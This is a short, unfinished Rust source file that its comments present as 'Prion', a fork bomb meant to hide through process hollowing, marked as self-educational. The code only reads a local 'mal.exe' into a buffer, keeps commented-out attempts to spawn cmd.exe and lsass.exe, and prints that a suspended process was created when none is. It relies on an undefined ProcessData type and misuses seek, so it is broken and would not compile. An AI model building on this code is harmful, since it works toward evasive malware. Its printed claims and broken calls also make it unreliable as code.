//Prion is a slow-moving fork bomb which tries to hide using process hollowing
//Created for self-educational purposes - DO NOT RUN OR DISTRIBUTE!

use std::process::{Command, Stdio};
use std::{thread, time, env};
use std::vec::Vec;
use std::fs::File;
use std::io::prelude::*;

extern crate subprocess;

use subprocess::{Popen, PopenConfig, Exec};

fn main() {
	//Command::new("C:\\windows\\system32\\lsass.exe")
	/*
	Command::new("C:\\windows\\system32\\cmd.exe")
			.spawn()
			.expect("Failed to start child process.\n");
	println!("cmd process created in suspended state.\n");
	*/
	
	//Read the malicious executable into a buffer
	let mut mal_buf = Vec::new();
	let mut mal_file = File::open("C:\\Users\\Emily\\Documents\\mal\\mal.exe").expect("Error opening file.\n");
	mal_file.read_to_end(&mut mal_buf).expect("Error reading file contents into buffer.\n");
	
	//println!("File:\n{:?}\n", mal_file);
	//println!("Buf contents:\n{:?}\n", mal_buf);
	
	//Popen::create(&["C:\\Users\\Emily\\Documents\\mal\\mal.exe"], PopenConfig::default()).unwrap().wait_timeout(time::Duration::from_millis(1000));
	//let mut mal_proc = Exec::shell("C:\\Users\\Emily\\Documents\\mal\\mal.exe").detached();
	//mal_proc.popen();
	//thread::sleep(time::Duration::from_millis(10000));
	
	let mal_data = ProcessData{pidh : mal_file.seek(0).unwrap(), pinh : mal_file.seek(1).unwrap()};
	
	println!("mal process created in suspended state.\n");	println!("Process data:\npidh: {:?}\n pinh: {:?}", mal_data.pidh, mal_data.pinh)
	
}

